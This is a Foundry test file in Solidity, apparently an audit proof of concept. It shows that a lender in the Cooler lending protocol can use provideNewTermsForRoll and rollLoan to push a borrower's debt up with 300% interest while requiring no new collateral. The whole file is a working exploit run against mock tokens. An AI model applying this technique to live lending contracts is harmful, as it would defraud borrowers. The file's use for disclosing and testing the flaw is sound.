// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

// Forge std utilities
import {Test} from "forge-std/Test.sol";

// Mocks & helpers shipped with the repo (live under src/test/*)
import {MockGohm} from "src/test/mocks/MockGohm.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {UserFactory} from "test/lib/UserFactory.sol";

// Protocol
import {CoolerFactory} from "src/CoolerFactory.sol";
import {Cooler} from "src/Cooler.sol";

/* -------------------------------------------------------------------------- */
/*                             Malicious Roll PoC                             */
/* -------------------------------------------------------------------------- */
/**
 * A malicious lender can weaponize `provideNewTermsForRoll` + `rollLoan` to
 * drastically inflate the borrower's outstanding debt while requiring ZERO
 * additional collateral. This test fully reproduces the attack.
 */
contract ExploitTest is Test {
    MockGohm internal collateral;
    MockERC20 internal debt;

    address internal borrower;
    address internal lender;

    CoolerFactory internal factory;
    Cooler internal cooler;

    uint256 internal constant INITIAL_DEBT_AMOUNT = 1_000 * 1e18;
    uint256 internal constant INITIAL_INTEREST    = 5e15;   // 0.5%
    uint256 internal constant INITIAL_RATIO       = 10 * 1e18;
    uint256 internal constant INITIAL_DURATION    = 365 days;

    uint256 internal constant MAL_INTEREST = 3e18; // 300%
    uint256 internal constant MAL_RATIO    = 1e60; // absurdly high -> 0 collateral needed
    uint256 internal constant MAL_DURATION = 365 days;

    uint256 internal constant DECIMALS = 1e18;

    function setUp() public {
        vm.warp(50 * 365 days);

        collateral = new MockGohm("COLLAT", "COLLAT", 18);
        debt = new MockERC20("DEBT", "DEBT", 18);

        UserFactory uf = new UserFactory();
        address[] memory users = uf.create(2);
        borrower = users[0];
        lender = users[1];

        deal(address(collateral), borrower, 2_000 * 1e18);
        deal(address(debt), lender, 20_000 * 1e18);

        factory = new CoolerFactory();
        vm.prank(borrower);
        cooler = Cooler(factory.generateCooler(collateral, debt));
    }

    function testExploit() public {
        // borrower requests loan
        uint256 colNeeded = _collateralFor(INITIAL_DEBT_AMOUNT);
        vm.startPrank(borrower);
        collateral.approve(address(cooler), colNeeded);
        uint256 reqID = cooler.requestLoan(
            INITIAL_DEBT_AMOUNT,
            INITIAL_INTEREST,
            INITIAL_RATIO,
            INITIAL_DURATION
        );
        vm.stopPrank();

        // lender clears
        vm.startPrank(lender);
        debt.approve(address(cooler), INITIAL_DEBT_AMOUNT);
        uint256 loanID = cooler.clearRequest(reqID, true, false);
        vm.stopPrank();

        Cooler.Loan memory beforeRoll = cooler.getLoan(loanID);

        // lender proposes malicious terms
        vm.prank(lender);
        cooler.provideNewTermsForRoll(loanID, MAL_INTEREST, MAL_RATIO, MAL_DURATION);
        assertEq(cooler.newCollateralFor(loanID), 0, "should require 0 additional collateral");

        // lender rolls the loan (no access control)
        vm.prank(lender);
        cooler.rollLoan(loanID);

        Cooler.Loan memory afterRoll = cooler.getLoan(loanID);

        // collateral unchanged
        assertEq(afterRoll.collateral, beforeRoll.collateral, "collateral changed");

        // debt inflated by malicious interest
        uint256 expectedNewDebt = cooler.interestFor(beforeRoll.amount, MAL_INTEREST, MAL_DURATION);
        uint256 expectedTotalDebt = beforeRoll.amount + expectedNewDebt;
        assertEq(afterRoll.amount, expectedTotalDebt, "unexpected debt amount");
    }

    function _collateralFor(uint256 debtAmount) internal pure returns (uint256) {
        return (debtAmount * DECIMALS) / INITIAL_RATIO;
    }
}
